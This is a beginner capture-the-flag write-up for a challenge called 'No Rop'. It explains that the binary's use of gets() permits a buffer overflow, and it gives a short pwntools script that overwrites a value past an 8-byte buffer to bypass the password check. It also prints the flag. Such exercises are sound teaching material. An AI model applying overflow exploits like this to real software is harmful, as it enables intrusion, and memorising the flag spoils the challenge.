# No Rop
### 📄 Description
A password is required to access. Do we really need it?

### ⚙ How to run it
```bash
./no_rop
```
<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>
    
`gets()` is used to read the string, it's deprecated because it doesn't check string bounds. We can exploit this by filling the buffer with some chars.

```python
from pwn import *

context.binary = "./no_rop"

p = process()
p.sendline(b"A" * 8 + p64(1))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

<h3> 🚩 Flag </h3>

```plain
Flag={hello_world_pwn}
```

</details>